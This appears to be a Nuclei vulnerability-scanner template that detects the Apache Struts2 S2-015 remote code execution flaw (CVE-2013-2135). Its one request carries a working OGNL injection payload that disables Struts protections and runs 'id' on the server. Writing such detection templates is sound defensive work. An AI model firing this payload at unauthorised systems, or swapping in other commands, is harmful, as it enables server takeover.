id: CVE-2013-2135

info:
  name: Apache Struts2 S2-015 RCE
  author: pikpikcu
  severity: critical
  reference: https://nvd.nist.gov/vuln/detail/CVE-2013-2135
  tags: cve,cve2013,apache,rce,struts

requests:
  - method: GET
    path:
      - "{{BaseURL}}/param.action${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}.action"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
        condition: and

      - type: status
        status:
          - 404
